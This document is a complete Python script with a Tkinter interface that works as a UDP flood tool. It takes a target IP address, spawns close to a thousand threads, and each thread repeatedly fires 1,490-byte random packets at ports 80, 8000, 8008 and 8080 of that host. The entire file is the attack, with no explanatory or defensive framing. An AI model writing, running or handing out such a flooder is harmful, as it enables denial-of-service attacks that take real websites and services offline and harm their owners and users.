import socket
import threading
import random
import tkinter as tk

window = tk.Tk()
window.geometry("300x200")

ip = tk.StringVar(window)

tk.Entry(window, textvariable = ip).pack(pady = 40)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
port = [80, 8000, 8008, 8080]
sent = 0
run = False
text = "State: OFF"
state = tk.Label(window, text = text)

def main():
    global bytes
    global ip
    global port
    global sent
    global run
    
    while 1:
        window.update()
        while run == True:
            window.update()
            if(ip.get() != ""):
                for _ in range(len(port)):
                    sock.sendto(bytes, (ip.get(), port[_]))
                    sent = sent + 1
                    print("Sent %s packets to %s throught port %s"%(sent, ip.get(), port[_]))

def runner():
    while threading.active_count() < 998:
        print(threading.active_count())
        threading.Thread(target = main, daemon = True).start()
        window.update()

def ss():
    global run
    global text
    global state

    if(run == False):
        run = True
        state.pack_forget()
        text = "State: ON"
        state = tk.Label(window, text = text)
        state.pack()
    elif(run == True):
        run = False
        state.pack_forget()
        text = "State: OFF"
        state = tk.Label(window, text = text)
        state.pack()

tk.Button(text = "Start/Stop", command = ss).pack()

state.pack()

threading.Thread(target = runner, daemon = True).start()

tk.mainloop()